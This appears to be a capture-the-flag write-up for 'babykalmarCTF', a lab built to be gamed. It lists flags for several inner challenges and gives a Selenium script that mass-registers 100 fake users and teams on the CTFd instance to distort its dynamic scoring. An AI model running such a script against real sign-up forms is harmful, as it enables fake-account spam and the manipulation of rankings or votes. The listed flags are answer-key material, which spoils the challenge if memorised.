```
Question: Ever played a CTF inside a CTF?

We were looking for a new scoring algorithm which would both reward top teams for solving super hard challenges, but also ensure that the easiest challenges wouldn't go to minimum straight away if more people played than we expected.

Thats when we came across this ingenious suggestion! sigpwny/ctfd-dynamic-challenges-mod#1

We've implemented it this scoring idea(see here: https://github.com/blatchley/ctfd-dynamic-challenges-mod ) and spun up a small test ctf to test it out.

If you manage to win babykalmarCTF, we'll even give you a flag at /flag!

Spin up your own personal babykalmarCTF here: https://lab1.kalmarc.tf/
```
---
### Goals
1. Trick the dynamic CTF scoring system.
2. Solve all the solvable CTF challenges.
3. Spam fake team registrations on the platform.
4. Outperform Kalmarunionen
---
### Solution:
Credit: @OS1R1S _for babyKalmarCTF challenges_
1. Within babyKalmarCTF there are several categories of challenges:
	- Baby's first RSA adventure (Crypto)
	- My First Flagchecker (Reverse)
	- THE OSINT CHALLENGE (OSINT)
	- Baffling, Ridiculous And Intriguing Letters, Laughter Ensues! (Misc)
	- Welcome Flag (Welcome)
	- Simple  Math Challenge (Impossible)
	- Baby's Second RSA (Impossible)
	- A randcrack challenge (Impossible)
	- The Last Step (Impossible)
	
2. Welcome Flag:   
	**Flag:** `babykalmar{welcome_to_babykalmar_CTF}`
	
3. My First Flagchecker:  
	**Flag:** `babykalmar{string_compare_rev_ayoooooooo}`
	
4. THE OSINT CHALLENGE:  
    **Flag:** `babykalmar{aarhus}`
	
5. Baffling, Ridiculous And Intriguing Letters, Laughter Ensues:  
	**Flag:** `BABYKALMAR{SUPERORIGINALMORSECODECHALLENGE}`
	
6. Baby's first RSA adventure:  
	**Flag**: `babykalmar{wow_you_are_an_rsa_master!!!!!}`


### Final Result
---
After solving all the challenges, we have to trick the scoring system. The script as below, to spam fake team registration, we designed an Auto Webform Filler.
```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Set up Firefox WebDriver
options = webdriver.FirefoxOptions()
options.headless = False

driver = webdriver.Firefox(options=options)

register_url = "https://45d9cb6b475c2631a4b32ccd8e0bcf6a-59591.inst1.chal-kalmarc.tf/register"
team_url = "https://45d9cb6b475c2631a4b32ccd8e0bcf6a-59591.inst1.chal-kalmarc.tf/teams/new"
logout_url = "https://45d9cb6b475c2631a4b32ccd8e0bcf6a-59591.inst1.chal-kalmarc.tf/logout"

for i in range(100): 
    driver.get(register_url)
    
    username = f"FakeUser{i}"
    email = f"fakeuser{i}@example.com"
    password = "P@ssw0rd123"

    driver.find_element(By.ID, "name").send_keys(username)
    driver.find_element(By.ID, "email").send_keys(email)
    driver.find_element(By.ID, "password").send_keys(password)

    driver.find_element(By.ID, "_submit").click()

    time.sleep(2)

    driver.get(team_url)
    
    team_name = f"FakeTeam{i}"
    driver.find_element(By.ID, "name").send_keys(team_name)
    driver.find_element(By.ID, "password").send_keys("TeamP@ssw0rd")

    driver.find_element(By.ID, "_submit").click()

    print(f"Registered {username} & Created Team {team_name}")

    driver.get(logout_url)
    time.sleep(2) 

driver.quit()
```
![](./assets/webform.gif)  
![](./assets/result.gif)  
**Flag:** `kalmar{w0w_y0u_b34t_k4lm4r_1n_4_c7f?!?}`
